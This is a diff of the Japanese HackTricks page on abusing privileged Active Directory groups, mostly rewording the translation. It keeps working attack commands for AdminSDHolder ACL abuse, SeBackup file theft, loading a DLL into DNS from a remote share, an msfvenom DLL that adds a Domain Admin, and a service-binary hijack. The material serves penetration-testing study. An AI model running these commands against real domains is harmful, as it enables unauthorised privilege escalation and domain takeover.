@@ -2,41 +2,41 @@
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使用して、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使って、ゼロからヒーローまでAWSハッキングを学ぶ</summary>
 
-HackTricksをサポートする他の方法：
+HackTricksをサポートする他の方法:
 
-- **HackTricksで企業を宣伝したい**場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦で私をフォローする：[**@carlospolopm**](https://twitter.com/carlospolopm)。
-- **ハッキングテクニックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)で**フォロー**する。
+* **ハッキングテクニックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。**
 
 </details>
 
 ## 管理特権を持つよく知られたグループ
 
-- **Administrators**
-- **Domain Admins**
-- **Enterprise Admins**
+* **Administrators**
+* **Domain Admins**
+* **Enterprise Admins**
 
 ## アカウントオペレーター
 
-このグループは、ドメイン上の管理者でないアカウントやグループを作成する権限を持っています。さらに、ドメインコントローラ（DC）へのローカルログインを有効にします。
+このグループは、ドメイン上の管理者でないアカウントやグループを作成する権限を持っています。さらに、ドメインコントローラー（DC）へのローカルログインを可能にします。
 
-このグループのメンバーを特定するために、次のコマンドが実行されます：
+このグループのメンバーを特定するために、次のコマンドが実行されます:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-新しいユーザーの追加が許可されており、DC01へのローカルログインも可能です。
+新しいユーザーの追加が許可されており、DC01へのローカルログインも許可されています。
 
 ## AdminSDHolderグループ
 
 **AdminSDHolder**グループのアクセス制御リスト（ACL）は、Active Directory内のすべての「保護されたグループ」、高特権グループを含む、権限を設定するために重要です。このメカニズムにより、これらのグループのセキュリティが確保され、未承認の変更が防止されます。
 
-攻撃者は、**AdminSDHolder**グループのACLを変更して、権限を完全に与えることで、標準ユーザーに対して攻撃を行う可能性があります。これにより、そのユーザーにはすべての保護されたグループに対する完全な制御権限が与えられます。このユーザーの権限が変更または削除された場合、システムの設計により、1時間以内に自動的に再設定されます。
+攻撃者は、**AdminSDHolder**グループのACLを変更して、標準ユーザーに完全な権限を付与することでこれを悪用する可能性があります。これにより、そのユーザーにはすべての保護されたグループに対する完全な制御権が与えられます。このユーザーの権限が変更または削除された場合、システムの設計により1時間以内に自動的に再設定されます。
 
-メンバーを確認し、権限を変更するためのコマンドは次のとおりです：
+メンバーを確認し権限を変更するためのコマンドは次の通りです：
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
@@ -66,9 +66,9 @@ C:\> .\PsService.exe security AppReadiness
 
 ## バックアップオペレーター
 
-`Backup Operators` グループへのメンバーシップは、`SeBackup` および `SeRestore` 特権により、`DC01` ファイルシステムへのアクセス権を提供します。これらの特権により、`FILE_FLAG_BACKUP_SEMANTICS` フラグを使用して、明示的なアクセス許可なしにフォルダのトラバーサル、リスト、およびファイルのコピーが可能となります。このプロセスには特定のスクリプトの利用が必要です。
+`Backup Operators` グループへのメンバーシップは、`SeBackup` および `SeRestore` 特権により、`DC01` ファイルシステムへのアクセスを提供します。これらの特権により、`FILE_FLAG_BACKUP_SEMANTICS` フラグを使用して、明示的なアクセス許可なしにフォルダのトラバーサル、リスト、およびファイルのコピーが可能となります。このプロセスには特定のスクリプトの利用が必要です。
 
-グループのメンバーをリストするには、次のコマンドを実行します:
+グループのメンバーをリストするには、次のコマンドを実行します：
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
@@ -86,7 +86,7 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-3. 制限されたディレクトリからファイルにアクセスしてコピーする場合、たとえば:
+3. 制限されたディレクトリからファイルにアクセスしてコピーする場合:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
@@ -144,13 +144,13 @@ echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\
 
 **DnsAdmins**グループのメンバーは、DNSサーバー（通常はドメインコントローラーにホストされる）で任意のDLLをSYSTEM権限で読み込む特権を悪用できます。この機能により、重要な悪用の可能性が生じます。
 
-DnsAdminsグループのメンバーをリストするには、次を使用します：
+DnsAdminsグループのメンバーをリストアップするには、次を使用します：
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### 任意のDLLの実行
 
-メンバーは、次のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有から）を読み込ませることができます：
+メンバーは、次のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有から）を読み込ませることができます。
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -170,26 +170,26 @@ system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /doma
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-DNSサービスを再起動する（追加の権限が必要かもしれません）必要があります。DLLが読み込まれるために。
+DNSサービスを再起動する（追加の権限が必要かもしれません）:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
 #### Mimilib.dll
-mimilib.dllを使用して、特定のコマンドやリバースシェルを実行するように変更することが可能です。詳細については、[この投稿](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)を参照してください。
+mimilib.dllを使用してコマンドを実行したり、特定のコマンドやリバースシェルを実行するように変更することも可能です。詳細については、[この投稿](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)を参照してください。
 
-### WPAD Record for MitM
-DnsAdminsは、グローバルクエリブロックリストを無効にした後、WPADレコードを作成することで、Man-in-the-Middle（MitM）攻撃を実行するためにDNSレコードを操作できます。 ResponderやInveighなどのツールを使用して、スプーフィングやネットワークトラフィックのキャプチャが可能です。
+### MitM用のWPADレコード
+DnsAdminsは、グローバルクエリブロックリストを無効にした後、WPADレコードを作成することで、Man-in-the-Middle（MitM）攻撃を実行することができます。 ResponderやInveighなどのツールを使用して、スプーフィングやネットワークトラフィックのキャプチャが可能です。
 
-### Event Log Readers
-メンバーはイベントログにアクセスでき、平文のパスワードやコマンド実行の詳細など、機密情報を見つける可能性があります。
+### イベントログリーダー
+メンバーはイベントログにアクセスでき、平文のパスワードやコマンドの実行の詳細など、機密情報を見つける可能性があります。
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
 ## Exchange Windows Permissions
-このグループは、ドメインオブジェクトのDACLを変更でき、DCSync権限を付与する可能性があります。このグループを悪用した特権昇格のテクニックについては、Exchange-AD-Privesc GitHubリポジトリで詳細に説明されています。
+このグループはドメインオブジェクトのDACLを変更でき、DCSync権限を付与する可能性があります。このグループを悪用した特権昇格のテクニックは、Exchange-AD-Privesc GitHubリポジトリで詳細に説明されています。
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
@@ -198,7 +198,7 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 Hyper-V管理者は、Hyper-Vへの完全なアクセス権を持ち、仮想化されたドメインコントローラーを制御するために悪用される可能性があります。これには、ライブDCのクローン作成やNTDS.ditファイルからNTLMハッシュを抽出することが含まれます。
 
 ### 悪用例
-FirefoxのMozilla Maintenance Serviceは、Hyper-V管理者によってSYSTEMとしてコマンドを実行するために悪用される可能性があります。これには、保護されたSYSTEMファイルへのハードリンクの作成と、それを悪意のある実行可能ファイルで置き換える作業が含まれます。
+FirefoxのMozilla Maintenance Serviceは、Hyper-V管理者によってSYSTEMとしてコマンドを実行される可能性があります。これには、保護されたSYSTEMファイルへのハードリンクの作成と、それを悪意のある実行可能ファイルで置き換える作業が含まれます。
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -210,15 +210,15 @@ sc.exe start MozillaMaintenance
 
 ### 特権悪用とコマンド
 
-#### プリント オペレータ
-**プリント オペレータ** グループのメンバーは、**`SeLoadDriverPrivilege`** を含む複数の特権を持っており、これにより**ドメインコントローラにローカルログオン**したり、シャットダウンしたり、プリンタを管理したりできます。これらの特権を悪用するには、特に**`SeLoadDriverPrivilege`** が昇格されていない状況で見えない場合、ユーザーアカウント制御（UAC）をバイパスする必要があります。
+#### プリント オペレーター
+**Print Operators** グループのメンバーは、**`SeLoadDriverPrivilege`** を含む複数の特権を持っており、これにより**ドメインコントローラーにローカルログオン**し、シャットダウン、プリンターの管理が可能です。特権を悪用するために、特に**`SeLoadDriverPrivilege`** が昇格されていない状況で表示されない場合、ユーザーアカウント制御（UAC）をバイパスする必要があります。
 
 このグループのメンバーをリストするために、次のPowerShellコマンドが使用されます：
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-#### リモート デスクトップ ユーザー
-このグループのメンバーは、リモート デスクトップ プロトコル（RDP）を介してPCにアクセスできます。これらのメンバーを列挙するには、PowerShellコマンドが使用できます：
+#### リモートデスクトップユーザー
+このグループのメンバーは、リモートデスクトッププロトコル（RDP）を介してPCにアクセスできます。これらのメンバーを列挙するには、PowerShellコマンドが使用できます：
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
@@ -262,7 +262,7 @@ HackTricksをサポートする他の方法：
 * **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
-* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする
+* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする
 * **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する
 
 </details>
